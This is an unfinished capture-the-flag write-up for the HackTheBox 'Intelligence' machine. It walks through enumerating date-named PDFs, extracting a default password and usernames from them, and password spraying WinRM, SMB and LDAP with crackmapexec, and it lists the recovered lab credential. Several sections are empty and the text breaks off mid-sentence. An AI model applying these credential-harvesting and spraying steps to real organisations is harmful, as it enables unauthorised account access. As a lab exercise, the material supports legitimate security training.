---
description: >-
  Intelligence HTB Machine
title: Intelligence (Medium)                # Add title here
date: 2023-05-30 08:00:00 -0600                           # Change the date to match completion date
categories: [HackTheBox, Windows - Medium]                     # Change Templates to Writeup
tags: [hackthebox, intelligence, ]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: true                                    # Change this to true
image: /assets/img/icons/Intelligence.png                # Add infocard image here for post preview image
---
### Host entries:
```bash
10.10.10.248
```
If Active Directory => [NTP Synchronization](https://shuciran.github.io/posts/NTP-Synchronization/) with the domain controller.

### Content

- 
- 

### Reconnaissance

Initial reconnaissance for TCP ports
```bash

```
Services and Versions running:
```bash

```

By enumerating the web server we identify the following links to download two different files:

![Web-Server-Download](/assets/img/Pasted image 20230530213130.png)

Accessing this links, we identify a pattern on both files `http://intelligence.htb/documents/2020-12-15-upload.pdf` and `http://intelligence.htb/documents/2020-01-01-upload.pdf` as we can see this seems to be an static link with a slightly difference which is the dates, so let's proceed to create a python script that creates a datelist:
```python
from datetime import datetime
import pandas as pd

# start date
start_date = datetime.strptime("2020-01-01", "%Y-%m-%d")
end_date = datetime.strptime("2020-12-31", "%Y-%m-%d")

# difference between each date. D means one day
days = 365

date_list = pd.date_range(start_date, periods=days).tolist()
#print(f"Creating list of dates starting from {start_date} to {end_date}")
#print(date_list)

# if you want dates in string format then convert it into string
#dates=date_list.strftime("%Y-%m-%d")
for i in range(0,days):
        print(date_list[i])
```
And then we print the results within a file:
```bash
python3 dates.py > dates
```
Since the results are in the format `2020-06-22 00:00:00` we need to treat the results we can do that with `sponge` and `cut` commands:
```bash
cat dates | cut -d " " -f1 | sponge dates
```
Then we have the list of dates needed to download all the URLs with a file inside, since the dates are only for 2020 year then we'll download from 2020-01-01 until 2020-12-31:
```bash
for i in $(cat dates); do wget http://intelligence.htb/documents/$i-upload.pdf ; done
```

Finally, we use the tool `pdfgrep` to search for strings such as `password` within the downloaded files:
```bash
pdfgrep 'password' *.pdf  
2020-06-04-upload.pdf:Please login using your username and the default password of:
2020-06-04-upload.pdf:After logging in please change your password as soon as possible.
```
Within this pdf we found a password `NewIntelligenceCorpUser9876`:
![Downloadable-Content-With-Password](/assets/img/Pasted image 20230530214716.png)

Now we need to search for a user, we can use the same command as before but unfortunately this is unsuccessful:
```bash
pdfgrep 'user' *.pdf    
2020-06-04-upload.pdf:Please login using your username and the default password of:
```
So let's try with an `exiftool` command over all the pdfs and extract a list of possible users as using `grep`, `tr` and `cut`:
```bash
exiftool *.pdf | grep Creator | tr -d " " | cut -d ":" -f2 > users
```
Now that we have credentials we can execute a [Password Spraying](https://shuciran.github.io/posts/Password-Spraying/) [^password-spraying] attack on winrm service:
```bash
crackmapexec winrm 10.10.10.248 -u users -p 'NewIntelligenceCorpUser9876' --continue-on-success
SMB         10.10.10.248    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:intelligence.htb)
<SNIP>
WINRM       10.10.10.248    5985   DC               [-] intelligence.htb\JACK.O'BRIEN:NewIntelligenceCorpUser9876
WINRM       10.10.10.248    5985   DC               [-] intelligence.htb\JACK.WATTS:NewIntelligenceCorpUser9876
WINRM       10.10.10.248    5985   DC               [-] intelligence.htb\JACK.ROSE:NewIntelligenceCorpUser9876
```
Unsuccessful response, so let's try the same attack but for SMB:
```bash
crackmapexec smb 10.10.10.248 -u users -p 'NewIntelligenceCorpUser9876' --continue-on-success 
SMB      10.10.10.248    445    DC   [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) 
SMB      10.10.10.248    445    DC   [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB      10.10.10.248    445    DC   [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876  
<SNIP>
SMB      10.10.10.248    445    DC   [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB      10.10.10.248    445    DC   [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB      10.10.10.248    445    DC   [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
<SNIP> 
SMB      10.10.10.248    445    DC   [-] intelligence.htb\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
```
Credentials work for user `Tiffany.Molina` on service SMB, however let's try with ldap as well:
```bash
crackmapexec smb 10.10.10.248 -u users -p 'NewIntelligenceCorpUser9876' --continue-on-success 
LDAP   10.10.10.248  445  DC  [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True)
LDAP   10.10.10.248  445  DC  [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
LDAP   10.10.10.248  445  DC  [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876  
<SNIP>
LDAP   10.10.10.248  445  DC  [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
LDAP   10.10.10.248  445  DC  [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
LDAP   10.10.10.248  445  DC  [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
<SNIP> 
LDAP   10.10.10.248  445  DC  [-] intelligence.htb\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
```
Since we have access to the 


### Exploitation


### Root privesc

### Post Exploitation

### Credentials

```bash
Tiffany.Molina:NewIntelligenceCorpUser9876
```

### Notes

-   Chisel have different configurations, this time we use a Forward SOCKS Proxy, which is a bind shell, that is not neccessarily the easiest way to forward the remote port, but is a new way to consider in case that a reverse shell is not possible.
-   Always look for exploits, analyze them and check if something can be useful to exploit the machine.
-   Chisel has some

### Resources

[^password-spraying]: Password Spraying

